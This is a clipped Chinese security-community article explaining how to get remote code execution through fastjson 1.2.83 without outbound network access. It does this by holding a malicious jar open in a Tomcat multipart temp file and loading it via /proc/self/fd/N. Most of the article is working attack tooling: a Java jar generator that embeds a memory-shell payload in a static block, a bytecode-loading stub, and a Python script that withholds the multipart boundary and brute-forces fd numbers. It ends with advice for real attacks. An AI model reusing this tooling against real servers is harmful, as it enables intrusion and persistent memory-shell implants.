---
title: 【先知】fastjson 1.2.83 如何不出网 RCE 利用
source: https://xz.aliyun.com/news/92680
source_host: xz.aliyun.com
clip_date: 2026-08-14T14:34:21+08:00
trace_id: 32401c9d-ab86-4be1-bb2a-887aec04693c
content_hash: 666dd3238974ef1cf43c55e056f0355fdc258f88c7d09eaaa83c568613616f6e
status: synced
tags:
  - 先知
  - fastjson
  - 不出网RCE
series: null
feed_source: 先知安全技术社区
ai_summary: fastjson 1.2.83 不出网 RCE 通过先让目标用 Tomcat multipart 把恶意 jar 写入自身临时文件并保持 fd 打开，再用 jar:file:/proc/self/fd/N 让目标自读 fd 中 jar 触发类加载，从而绕过出网限制。
ai_summary_style: key-points
images_status:
  total: 7
  succeeded: 7
  failed_urls: []
notion_page_id: 3bc75244-d011-81df-80ac-c57d8258aba9
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> fastjson 1.2.83 不出网 RCE 通过先让目标用 Tomcat multipart 把恶意 jar 写入自身临时文件并保持 fd 打开，再用 jar:file:/proc/self/fd/N 让目标自读 fd 中 jar 触发类加载，从而绕过出网限制。
> 
> - **核心载荷：** `{"@type":"jar:http://xxx!/POC"}` 或 `{"@type":"jar:file:/proc/self/fd/N!/fdN.Exception"}`，利用 fastjson 加载 jar 中类并触发静态块执行。
> - **利用前提（Tomcat 临时文件）：** Spring Boot 默认 `file-size-threshold=0`，multipart 文件部分会全部落盘到 `work/Tomcat/xxx/ROOT/` 下，生成 `upload_*.tmp` 临时文件，并占用对应 fd；通过 `/proc/self/fd/N` 可指向该临时文件。
> - **阶段 A（占 fd）：** 发送 multipart 请求，内容为 jar + 60000 字节 padding，但故意不发结尾 `--boundary--`，让 Tomcat 认为请求未完成，fd 保持打开、临时文件不被释放，同时用 `Connection: keep-alive` 固定 fd 编号。
> - **阶段 B（自读触发）：** 并发向目标发送 `{"@type":"jar:file:.proc.self.fd.N!.fdN.Exception"}`，遍历目标自身 fd 范围（如 1-100），命中后 fastjson 从该 fd 读取 jar 并加载 `fdN.Exception` 类，类静态块中注入的内存马代码被执行。
> - **限制与注意事项：** Spring Boot 默认 `max-file-size=1MB`，生成 jar 必须小于 1MB，否则上传被拒导致 fd 上无完整 jar；实际攻击中 fd 编号难预测，建议用工具多次生成不同 fd 范围的 jar，结合迭代发包碰撞。

fastjson1.2.83 RCE的原理不多赘述，核心Payload为

```plain
{"@type":"jar:http:..XXXXXX:18080.POC!.POC"}
或者
{"@type":"jar:file:.tmp.POC!.POC"}
```

本文主要给大家讲解下如何在不出网的情况下实现RCE呢？简单来说就是通过Tomcat临时文件上传到服务器，然后通过fd加载临时文件实现RCE。先来了解几个概念。

**Tomcat临时文件**

Spring Boot 默认内嵌 Tomcat 作为 Servlet 容器，Tomcat可通过 multipart 上传临时文件到服务器，具体如下：

1.  临时文件落盘：Tomcat 解析 multipart 请求时，对每个 file part，若其大小超过 `file-size-threshold` （默认 0，即所有部分都落盘），会在 `javax.servlet.context.tempdir` 指向的工作目录（形如 `work/Tomcat/xxx/ROOT/` ）下创建一个磁盘临时文件（文件名形如 `upload_xxxxxxxx.tmp` ）；
2.  占用 fd：Tomcat 打开该临时文件写入上传内容，进程因此获得一个文件描述符 fd N， `/proc/self/fd/N` 即指向这个临时文件；
3.  这样上传的 `jar` （+padding）内容被写入这个临时文件，于是 fd N = 临时文件 = jar 内容
4.  `jar:file:/proc/self/fd/N!/fdN.Exception` 让 fastjson 打开 fd N（即 Tomcat 的临时文件），读取其中的 jar，加载 `fdN.Exception` 类

**/proc/self/fd**

Linux 下 `/proc/self/fd/N` 是一个符号链接，指向当前进程打开的第 N 号文件描述符所对应的文件/套接字/管道。

思路：

-   如果能让目标 先把恶意 jar 内容挂在自己的某个 fd 上（且该 fd 保持不关闭）；
-   再让 fastjson 用 `jar:file:/proc/self/fd/N` 去读这个 fd，目标就等于 自己读自己已缓存的内容；

这样把"目标主动拉取远程类"转换为"目标读取自身 fd 中的类"，绕过出网限制。

```plain
flowchart TD
    A["生成jar<br/>(1 first-stage + 100 fd类, ~853KB)"] --> B["阶段A: 上传 jar+padding<br/>扣留结尾 boundary, 保持 fd open"]
    B --> C["阶段B: 并发 @type=jar:file:.proc.self.fd.N<br/>让目标从自身 fdN 读 jar 加载类"]
    C --> D{"命中 fd?"}
    D -- 否 --> E["fd 编号不对<br/>换范围(101-200)重新生成 jar"]
    E --> A
    D -- 是 --> F["加载 fdN.Exception<br/>触发 clinit 注入内存马"]
```

数据流向：

```plain
阶段A上传jar ──► Tomcat multipart解析 ──► 写入临时文件(.tmp) ──► 占用fd N
                                                                    │
                          /proc/self/fd/N ◄────────────────────────┘
                                    │
                          fastjson jar:file:/proc/self/fd/N ──► 读取jar ──► 加载类
```

这样思路其实很明显了，只要我们通过Tomcat上传Jar临时文件，然后通过 fastjson加载jar:file/proc/self/fd/N从fd中加载这个Jar实现RCE。

```plain
{"@type":"jar:file:.proc.self.fd.1!.fd1.Exception"}
```

## 代码实现

输入 jar_url、payload 文件（内存马）和 fd 范围，它把内存马塞进 Java 类的 `static {}` 静态块，用 `javac` 编译成 class，再用 ASM 把类名改成 `jar:file:/proc/self/fd/N!/fdN/Exception` 这种路径式名称，最后打包成 jar

```plain
//FastjsonFdExploit.java

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.nio.file.FileVisitOption;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.FileAttribute;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

public class FastjsonFdExploit {
    private static final int DEFAULT_MIN_FD = 3;
    private static final int DEFAULT_MAX_FD = 256;
    private static final Pattern IP_PATTERN = Pattern.compile("(\\d{1,3})\\.(\\d{1,3})\\.(\\d{1,3})\\.(\\d{1,3})");
    private static final Pattern JAR_NAME_PATTERN = Pattern.compile("/([^/]+)!/(.+)");

    public static void main(String[] strArr) throws Exception {
        if (strArr.length < 2) {
            printUsage();
            return;
        }
        String str = strArr[0];
        String str2 = strArr[1];
        ArrayList arrayList = new ArrayList();
        for (int i = 2; i < strArr.length; i++) {
            if ("-v".equals(strArr[i])) {
                verbose = true;
            } else {
                try {
                    arrayList.add(Integer.valueOf(Integer.parseInt(strArr[i])));
                } catch (NumberFormatException e) {
                    System.err.println("Unknown argument: " + strArr[i]);
                    printUsage();
                    return;
                }
            }
        }
        int iIntValue = arrayList.size() >= 1 ? ((Integer) arrayList.get(0)).intValue() : 3;
        int iIntValue2 = arrayList.size() >= 2 ? ((Integer) arrayList.get(1)).intValue() : 256;
        if (arrayList.size() > 2) {
            System.err.println("Too many fd arguments (at most min max)");
            printUsage();
            return;
        }
        if (iIntValue < 0 || iIntValue2 < iIntValue) {
            System.err.println("Invalid fd range: min=" + iIntValue + " max=" + iIntValue2);
            return;
        }
        log("[fd-range] " + iIntValue + " .. " + iIntValue2 + " (" + ((iIntValue2 - iIntValue) + 1) + " classes)");
        String strDeriveJarName = deriveJarName(str);
        String strConvertIpToInt = convertIpToInt(str);
        if (!strConvertIpToInt.equals(str)) {
            log("[ip-convert] " + str + " -> " + strConvertIpToInt);
        } else {
            log("[ip-convert] no IP found, using as-is: " + strConvertIpToInt);
        }
        byte[] bArrGenerateClass = generateClass(strConvertIpToInt, str2);
        String strSubstring = strConvertIpToInt.substring(0, strConvertIpToInt.lastIndexOf("!/") + 2);
        byte[] bArrGenerateFirstStageClass = generateFirstStageClass(strSubstring + "foo/Exception");
        Path path = Paths.get(strDeriveJarName, new String[0]);
        JarOutputStream jarOutputStream = new JarOutputStream(Files.newOutputStream(path, new OpenOption[0]), new Manifest());
        Throwable th = null;
        try {
            try {
                jarOutputStream.putNextEntry(new ZipEntry("foo/Exception.class"));
                jarOutputStream.write(bArrGenerateFirstStageClass);
                jarOutputStream.closeEntry();
                for (int i2 = iIntValue; i2 <= iIntValue2; i2++) {
                    byte[] bArrRenameClass = renameClass(bArrGenerateClass, "jar:file:/proc/self/fd/" + i2 + "!/fd" + i2 + "/Exception");
                    jarOutputStream.putNextEntry(new ZipEntry("fd" + i2 + "/Exception.class"));
                    jarOutputStream.write(bArrRenameClass);
                    jarOutputStream.closeEntry();
                }
                if (jarOutputStream != null) {
                    if (0 != 0) {
                        try {
                            jarOutputStream.close();
                        } catch (Throwable th2) {
                            th.addSuppressed(th2);
                        }
                    } else {
                        jarOutputStream.close();
                    }
                }
                System.out.println("[done] " + strDeriveJarName + " (1 first-stage + " + ((iIntValue2 - iIntValue) + 1) + " fd classes, total: " + Files.size(path) + " bytes)\n");
                System.out.println("利用Payload如下 (发送整个JSON数组):\n");
                String strReplace = strSubstring.replace("jar:http://", "");
                String strReplace2 = strReplace.substring(0, strReplace.length() - 2).replace('/', '.');
                StringBuilder sb = new StringBuilder();
                sb.append("[\n");
                sb.append("  {\"@type\":\"jar:http:.." + strReplace2 + "!.foo.Exception\"},\n");
                for (int i3 = iIntValue; i3 <= iIntValue2; i3++) {
                    sb.append("  {\"@type\":\"jar:file:.proc.self.fd." + i3 + "!.fd" + i3 + ".Exception\"}");
                    if (i3 < iIntValue2) {
                        sb.append(",");
                    }
                    sb.append("\n");
                }
                sb.append("]");
                System.out.println(sb.toString());
            } finally {
            }
        } catch (Throwable th3) {
            if (jarOutputStream != null) {
                if (th != null) {
                    try {
                        jarOutputStream.close();
                    } catch (Throwable th4) {
                        th.addSuppressed(th4);
                    }
                } else {
                    jarOutputStream.close();
                }
            }
            throw th3;
        }
    }

    static String convertIpToInt(String str) {
        Matcher matcher = IP_PATTERN.matcher(str);
        StringBuffer stringBuffer = new StringBuffer();
        while (matcher.find()) {
            matcher.appendReplacement(stringBuffer, String.valueOf((Long.parseLong(matcher.group(1)) << 24) | (Long.parseLong(matcher.group(2)) << 16) | (Long.parseLong(matcher.group(3)) << 8) | Long.parseLong(matcher.group(4))));
        }
        matcher.appendTail(stringBuffer);
        return stringBuffer.toString();
    }

    static String deriveJarName(String str) {
        Matcher matcher = JAR_NAME_PATTERN.matcher(str);
        if (matcher.find()) {
            return matcher.group(1) + ".jar";
        }
        return extractSimpleName(str).toLowerCase() + ".jar";
    }

    static String extractSimpleName(String str) {
        String strSubstring = str;
        if (strSubstring.contains("/")) {
            strSubstring = strSubstring.substring(strSubstring.lastIndexOf(47) + 1);
        }
        if (strSubstring.contains(".")) {
            strSubstring = strSubstring.substring(strSubstring.lastIndexOf(46) + 1);
        }
        return strSubstring;
    }

    static byte[] generateClass(String str, String str2) throws Exception {
        String strTrim = new String(Files.readAllBytes(Paths.get(str2, new String[0])), "UTF-8").trim();
        log("[static] loaded from " + str2 + " (" + strTrim.length() + " chars)");
        if (strTrim.startsWith("{")) {
            strTrim = strTrim.substring(1, strTrim.length() - 1).trim();
        }
        String strExtractSimpleName = extractSimpleName(str);
        String str3 = "import com.alibaba.fastjson.annotation.JSONType;\n@JSONType(asm = false)\npublic class " + strExtractSimpleName + " {\n    static {\n        try {\n            " + strTrim.replace("\n", "\n            ") + "\n        } catch (Throwable t) {\n            t.printStackTrace();\n        }\n    }\n}\n";
        log("[source] ====");
        log(str3);
        log("============");
        Path pathCreateTempDirectory = Files.createTempDirectory("exploit-", new FileAttribute[0]);
        Path pathResolve = pathCreateTempDirectory.resolve(strExtractSimpleName + ".java");
        Files.write(pathResolve, str3.getBytes("UTF-8"), new OpenOption[0]);
        String property = System.getProperty("java.home");
        String str4 = property + "/bin/javac";
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            str4 = str4 + ".exe";
        }
        if (!new File(str4).exists()) {
            str4 = new File(property).getParent() + "/bin/javac";
        }
        ProcessBuilder processBuilder = new ProcessBuilder(str4, "-cp", System.getProperty("java.class.path"), "-d", pathCreateTempDirectory.toString(), pathResolve.toString());
        processBuilder.redirectErrorStream(true);
        Process processStart = processBuilder.start();
        StringBuilder sb = new StringBuilder();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(processStart.getInputStream()));
        Throwable th = null;
        while (true) {
            try {
                try {
                    String line = bufferedReader.readLine();
                    if (line == null) {
                        break;
                    }
                    sb.append(line).append("\n");
                } finally {
                }
            } catch (Throwable th2) {
                if (bufferedReader != null) {
                    if (th != null) {
                        try {
                            bufferedReader.close();
                        } catch (Throwable th3) {
                            th.addSuppressed(th3);
                        }
                    } else {
                        bufferedReader.close();
                    }
                }
                throw th2;
            }
        }
        if (bufferedReader != null) {
            if (0 != 0) {
                try {
                    bufferedReader.close();
                } catch (Throwable th4) {
                    th.addSuppressed(th4);
                }
            } else {
                bufferedReader.close();
            }
        }
        if (processStart.waitFor() != 0) {
            throw new RuntimeException("javac compilation failed:\n" + ((Object) sb) + "\nSource:\n" + str3);
        }
        if (sb.length() > 0) {
            log("[javac] " + sb.toString().trim());
        }
        Path pathResolve2 = pathCreateTempDirectory.resolve(strExtractSimpleName + ".class");
        if (!Files.exists(pathResolve2, new LinkOption[0])) {
            throw new RuntimeException("compiled class not found: " + pathResolve2);
        }
        byte[] bArrRenameClass = renameClass(Files.readAllBytes(pathResolve2), str);
        Files.walk(pathCreateTempDirectory, new FileVisitOption[0]).sorted(Comparator.reverseOrder()).map((v0) -> {
            return v0.toFile();
        }).forEach((v0) -> {
            v0.delete();
        });
        return bArrRenameClass;
    }

    static byte[] generateFirstStageClass(String str) {
        ClassWriter classWriter = new ClassWriter(1);
        classWriter.visit(52, 1, str, null, "java/lang/Object", null);
        MethodVisitor methodVisitorVisitMethod = classWriter.visitMethod(1, "<init>", "()V", null, null);
        methodVisitorVisitMethod.visitCode();
        methodVisitorVisitMethod.visitVarInsn(25, 0);
        methodVisitorVisitMethod.visitMethodInsn(183, "java/lang/Object", "<init>", "()V", false);
        methodVisitorVisitMethod.visitInsn(177);
        methodVisitorVisitMethod.visitMaxs(1, 1);
        methodVisitorVisitMethod.visitEnd();
        classWriter.visitEnd();
        return classWriter.toByteArray();
    }

    static byte[] renameClass(byte[] bArr, final String str) {
        ClassReader classReader = new ClassReader(bArr);
        ClassWriter classWriter = new ClassWriter(1);
        classReader.accept(new ClassVisitor(Opcodes.ASM9, classWriter) { // from class: FastjsonFdExploit.1
            @Override // org.objectweb.asm.ClassVisitor
            public void visit(int i, int i2, String str2, String str3, String str4, String[] strArr) {
                super.visit(i, i2, str, str3, str4, strArr);
            }
        }, 0);
        return classWriter.toByteArray();
    }
}
```

```plain
//rce.txt
    String base64Str = "";
    byte[] bytecode = null;
    try {
        Class base64Clz = Class.forName("java.util.Base64");
        Object decoder = base64Clz.getMethod("getDecoder").invoke(null);
        bytecode = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
    } catch (ClassNotFoundException ee) {
        Class datatypeConverterClz = Class.forName("javax.xml.bind.DatatypeConverter");
        bytecode = (byte[]) datatypeConverterClz.getMethod("parseBase64Binary", String.class).invoke(null, base64Str);
    }
    java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
    defineClass.setAccessible(true);
    Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), bytecode, 0, bytecode.length);
    clazz.newInstance();
```

实现效果如下，由于是不出网RCE，这个jar:http地址可以随意填，rce.txt如上为要执行的代码，1 100为fd1-100迭代，会在本地生成一个JAR文件。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/a887f4a6c8231025.png)

然后这里有个点要注意，关于Springboot临时文件限制的问题。

Spring Boot 默认 multipart 配置：

|     |     |     |
| --- | --- | --- |  
| 配置项 | 默认值 | 作用  |
| `spring.servlet.multipart.max-file-size` | **1MB** | 单个上传文件部分最大体积 |
| `spring.servlet.multipart.max-request-size` | 10MB | 整个请求最大体积 |
| `spring.servlet.multipart.file-size-threshold` | 0   | 超过阈值写磁盘临时文件 |

Spring Boot 在流式接收时会将该部分写入临时文件（落盘到 fd 指向的临时区）。一旦单个文件部分超过 1MB，Spring Boot 抛 `MaxUploadSizeExceededException` ，临时文件被拒绝/截断，fd 上无法驻留完整 jar 内容，读到的不是有效 jar，利用失败。

所以在指定fd大小的时候需要注意生成的jar文件大小。

还有一个用于发包的脚本，这个可以自行更改。

```plain
//exploit.py
#!/usr/bin/env python3
import socket, sys, time, json, threading, ssl
from urllib.parse import urlparse

jar_path = sys.argv[1]
raw = sys.argv[2]
PAD = 60000
FD0 = int(sys.argv[3])
FD1 = int(sys.argv[4])

u = urlparse(raw if "://" in raw else "http://" + raw)
scheme = (u.scheme or "http").lower()
host   = u.hostname
port   = u.port or (443 if scheme == "https" else 80)
path   = u.path or "/"
if u.query: path += "?" + u.query
default_port = (scheme == "http" and port == 80) or (scheme == "https" and port == 443)
host_hdr = host if default_port else f"{host}:{port}"

def conn():
    s = socket.create_connection((host, port), timeout=30)
    if scheme == "https":
        s = ssl._create_unverified_context().wrap_socket(s, server_hostname=host)
    return s

jar = open(jar_path, "rb").read()
bnd = "----XuanBoundary"
A_head = (f"--{bnd}\r\n"
    'Content-Disposition: form-data; name="file"; filename="x.jar"\r\n'
    "Content-Type: application/octet-stream\r\n\r\n").encode()
A_tail = f"\r\n--{bnd}--\r\n".encode()
A_body = A_head + jar + b"\x00"*PAD
A_clen = len(A_head)+len(jar)+PAD+len(A_tail)
A_req = (f"POST {path} HTTP/1.1\r\nHost: {host_hdr}\r\n"
    f"Content-Type: multipart/form-data; boundary={bnd}\r\n"
    f"Content-Length: {A_clen}\r\nConnection: keep-alive\r\n\r\n").encode()

# A: 发完整 JAR+padding, withhold 结尾 boundary -> fd 开着,temp 完整不增长
sA = conn()
sA.sendall(A_req + A_body)
print(f"[A] JAR({len(jar)})+padding({PAD}) -> {scheme}://{host_hdr}{path} , fd 开着")
time.sleep(1.0)

def fire(n):
    body = json.dumps({"@type": f"jar:file:.proc.self.fd.{n}!.fd{n}.Exception"}).encode()
    req = (f"POST {path} HTTP/1.1\r\nHost: {host_hdr}\r\n"
        f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n").encode() + body
    try:
        s = conn(); s.settimeout(8); s.sendall(req)
        try: s.recv(8192)          # 让服务端处理完,内容不关心
        except Exception: pass
        s.close()
    except Exception:
        pass

print(f"[B] 并发打 fd {FD0}..{FD1} ...")
ts = [threading.Thread(target=fire, args=(n,)) for n in range(FD0, FD1+1)]
for t in ts: t.start()
for t in ts: t.join(timeout=12)
print("[*] 完成。自行检测是否成功！")
sA.close()
```

**阶段 A（占 fd）**  
用 `multipart/form-data` 把整个 JAR + 60000 字节 padding 发到目标，但故意不发结尾的 `--boundary--` ，让请求"未完成"。目标（Tomcat）为此连接分配的 fd 保持打开，jar 内容驻留在该 fd 指向的临时文件里不释放。 `keep-alive` 保持连接，fd 编号固定。

**阶段 B（触发自读）**  
并发对每个 fd 编号 N 发：

```plain
{"@type":"jar:file:.proc.self.fd.N!.fdN.Exception"}
```

让 fastjson 从目标自身的 `/proc/self/fd/N` 读取阶段 A 塞入的 jar，加载 `fdN.Exception` 类，触发静态块执行内存马。多线程并发 + 8s 超时快速覆盖整个 fd 范围，命中即成功。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/05e30592e15a4191.png)

具体工具链接可参考： [https://github.com/Axyanzzzz/FastjsonExploit](https://github.com/Axyanzzzz/FastjsonExploit)

## 复现

首先在MemShellParty中生成一个内存马，复制到rce.txt中，然后执行以下命令生成jar，fd从1-100枚举(大小不超过1MB)

```plain
java -jar fastjsonfdExploit.jar 'jar:http://127.0.0.1:18080/xuan!/foo/Exception' rce.txt 1 100
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/3a2b0879ef8fa5e1.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/a887f4a6c8231025.png)

然后运行exploit.py发送数据包

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/8f184a24d272aa86.png)

在服务器上可以查看到如下日志，说明成功碰撞到fd并加载了jar，内存马注入成功。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/240d002d8a2148e2.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/84be9556804f7450.png)

真实攻击场景下，fd值可能不好预测，但是由于Spring Boot 默认 multipart 配置问题，不建议一次生成fd差值较大的JAR,可以通过fastjsonfdExploit.jar多生成几次jar使用不同的fd进行迭代循环发包来碰撞fd。
